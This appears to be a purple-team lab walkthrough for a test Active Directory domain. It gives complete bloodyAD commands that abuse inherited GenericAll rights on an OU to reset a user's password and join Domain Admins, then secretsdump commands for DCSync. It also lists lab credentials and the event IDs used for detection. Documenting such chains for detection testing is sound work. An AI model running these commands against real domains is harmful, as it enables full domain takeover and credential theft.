# WT#016 — ACL GenericAll on OU

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.10 (dc01) |
| **Domain** | cadre.local |
| **Starting Credential** | analyst_dfir / An@lyst_DF1R! |
| **Tools Required** | bloodyAD, impacket-secretsdump |
| **Certifications** | CRTE |
| **MITRE ATT&CK** | T1098 |
| **Difficulty** | Medium |

## Prerequisites
- analyst_dfir has GenericAll on OU=Command,DC=cadre,DC=local
- GenericAll on an OU inherits to all child objects (users, groups, computers in that OU)
- chief_command is in OU=Command (inheritable ACE)

## Attack Steps

### Step 1 — Verify the ACL
```bash
# From kali, verify analyst_dfir has GenericAll on OU=Command
bloodyAD --host dc01.cadre.local -d cadre.local -u analyst_dfir -p 'An@lyst_DF1R!' get aces 'OU=Command,DC=cadre,DC=local'

# Expected: analyst_dfir has GenericAll on OU=Command
# Inheritance flag: ContainerInherit + ObjectInherit → flows to all objects in OU
```

### Step 2 — Reset chief_command password via inherited rights
```bash
# GenericAll on OU=Command provides full control over chief_command
# Use bloodyAD to reset the password
bloodyAD --host dc01.cadre.local -d cadre.local -u analyst_dfir -p 'An@lyst_DF1R!' set password 'CN=chief_command,OU=Command,DC=cadre,DC=local' 'C0mm@nd_Ch1ef!_N3w!'

# Alternative: Add analyst_dfir to Command-Cadre group (which contains chief_command)
# Or add analyst_dfir directly to Domain Admins
bloodyAD --host dc01.cadre.local -d cadre.local -u analyst_dfir -p 'An@lyst_DF1R!' add groupmember 'CN=Domain Admins,CN=Users,DC=cadre,DC=local' 'CN=analyst_dfir,OU=DFIR,DC=cadre,DC=local'
```

### Step 3 — Authenticate as DA
```bash
# Verify DA access
impacket-secretsdump 'cadre.local/analyst_dfir:An@lyst_DF1R!'@192.168.77.10 -just-dc

# Or authenticate as the reset chief_command
impacket-secretsdump 'cadre.local/chief_command:C0mm@nd_Ch1ef!_N3w!'@192.168.77.10
```

## Post-Exploitation Chain
WT#016 → analyst_dfir added to Domain Admins → DCSync → full domain compromise → AdminSDHolder persistence (WT#025)

## Telemetry Verification
- **Elastic Index:** `logs-system.security-*`
- **Expected Events:**
  - Event ID 5136: Directory service object modification (modification on OU=Command or child objects)
  - Event ID 4724: Password reset attempt on chief_command
  - Event ID 4743: Computer account deletion or change
  - Event ID 4728: Member added to security-enabled global group (analyst_dfir → Domain Admins)
  - Event ID 4672: Special privileges assigned to new logon
  - Sysmon EID 1: bloodyAD.exe, python.exe
- **Detection note:** Unlike WT#015 (direct ForceChangePassword), this attack exploits OU-level inheritance. The 5136 events target objects deep in the OU tree. Group membership changes (4728) on Domain Admins are the clearest signal.

## Status
CONFIGURED
